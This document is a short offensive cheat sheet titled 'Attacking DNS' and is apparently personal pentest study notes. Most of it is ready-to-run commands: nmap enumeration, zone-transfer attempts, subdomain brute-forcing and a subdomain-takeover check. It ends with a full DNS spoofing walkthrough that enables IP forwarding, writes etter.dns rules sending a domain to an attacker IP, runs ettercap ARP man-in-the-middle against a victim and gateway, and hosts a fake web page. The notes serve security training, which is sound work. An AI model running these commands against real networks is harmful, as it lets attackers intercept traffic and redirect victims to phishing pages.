## Attacking DNS

```bash
# enum 
  nmap -p53 -Pn -sV -sC <ip>

## DNS Zone Transfer
  dig AXFR @sub.domain.com <sub>/domain.com
  fierce --domain zonetransfer.me # enum all DNS servers of the root domain and scan for a zone tran

## enum subdomians
  # enum using online dns servers 
  ./subfinder -d inlanefreight.com -v #=>find <sub>.<domain>.com
  
  # enum using internal dns servers
  git clone https://github.com/TheRook/subbrute.git 
  cd subbrute && echo "ns1.inlanefreight.com" > ./resolvers.txt
  ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt #=> find <sub>.<domian>.com

## subdomain takeover
  dig ANY <sub>.<domain>.com @<dns_server> # CNAME <another>.domain.com
  host <sub>.<domain>.com # => is an alias for <another>.<domain>.com
  curl <another>.<domain>.com #=-> NoSuchBucket error

## DNS Spoofing
  
  # Turn on IP forwarding
  echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

  # Edit the DNS spoof rules
  sudo nano /usr/share/ettercap/etter.dns

  # Add this at the bottom of the file:
  # Send all requests to example.com to our attacker IP (change IP as needed)
  # example.com     A     <attacker-ip>
  # *.example.com   A     <attacker-ip>

  # Start Ettercap in text mode (-T), quiet (-q), interface (-i), MITM ARP mode (-M), and load dns_spoof plugin (-P)
  # Use / / to spoof all devices on the network
  sudo ettercap -T -q -i wlan0 -M arp:remote /<victimIP>/ /<gatewayIP>/ -P dns_spoof

  # (On attacker) Host a fake web page (in the current folder)
  sudo python3 -m http.server 80
```

## Latest DNS Vulnerabilities
```bash
 subdomain takeover # already noted 
```